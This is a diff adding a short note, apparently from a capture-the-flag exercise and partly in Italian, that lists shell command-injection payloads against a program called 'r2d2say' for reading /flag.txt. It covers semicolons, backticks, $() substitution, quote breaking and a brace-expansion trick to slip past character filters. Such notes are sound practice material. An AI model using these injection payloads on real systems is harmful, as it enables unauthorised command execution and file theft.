@@ -1,0 +1,17 @@
+
+
+r2d2say hello;cat /flag.txt
+
+r2d2say `cat /flag.txt`
+
+r2d2say $(cat /flag.txt)
+
+r2d2say "; cat /flag.txt; #
+
+se queste non dovessero funzionare x controlli sulla punteggiatura oppure usa head, less, tail
+
+r2d2say $({echo,c{a,t}}|tr -d ,) /flag.txt
+r2d2say $(</flag.txt)
+
+
+altra opzione potresti provare ad iniettare dentro r2d2say stesso.
